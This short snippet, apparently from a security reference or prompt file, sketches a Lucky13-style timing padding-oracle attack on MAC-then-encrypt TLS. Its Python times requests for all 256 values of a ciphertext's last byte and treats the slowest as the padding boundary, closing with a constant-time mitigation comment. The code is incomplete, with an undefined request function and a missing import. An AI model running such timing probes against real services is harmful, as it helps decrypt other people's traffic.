    <timing_attack_variant>
      Exploit timing-based padding oracles:
      {% raw %}
      # Lucky13 attack concept
      # MAC-then-encrypt in TLS
      # Different padding lengths = different processing times

      # Timing measurement
      import statistics

      def measure_timing(ciphertext, iterations=100):
          times = []
          for _ in range(iterations):
              start = time.perf_counter()
              send_request(ciphertext)
              elapsed = time.perf_counter() - start
              times.append(elapsed)
          return statistics.median(times)

      # Compare timing for different byte values
      timings = {}
      for byte_value in range(256):
          modified = ciphertext[:-1] + bytes([byte_value])
          timings[byte_value] = measure_timing(modified)

      # Byte with significantly different timing indicates padding boundary
      valid_padding_byte = max(timings.keys(), key=lambda k: timings[k])

      # Mitigation: Constant-time comparison
      # Always process same number of bytes regardless of padding
      {% endraw %}
    </timing_attack_variant>
